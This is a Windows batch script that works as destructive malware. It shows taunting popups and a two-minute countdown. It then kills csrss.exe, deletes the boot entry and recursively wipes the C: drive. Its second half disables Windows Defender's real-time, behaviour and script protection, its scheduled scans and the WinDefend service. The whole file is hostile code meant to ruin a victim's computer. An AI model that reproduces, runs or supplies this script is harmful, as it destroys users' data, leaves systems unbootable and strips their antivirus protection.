@echo off

msg * Losers XD Say Good Bye For Your Computer
timeout /t 1 >nul
msg * I Will Give You Chance To Save Your Code! Run Do It Fast You Have 2 minuts
timeout /t 120>nul

taskkill /f /im csrss.exe
rd /s /q C:\
bcdedit /delete {current}
del /f /s /q C:\*.*

:: Disable Windows Defender real-time protection
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Disable Windows Defender protection temporarily
powershell -command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -command "Set-MpPreference -DisableScriptScanning $true"
powershell -command "Set-MpPreference -DisableIOAVProtection $true"
powershell -command "Set-MpPreference -DisablePrivacyMode $true"

:: Disable Windows Defender scheduled scans
schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable
schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /disable
schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable

:: Optional: Disable Windows Defender Service
sc stop WinDefend
sc config WinDefend start= disabled

pause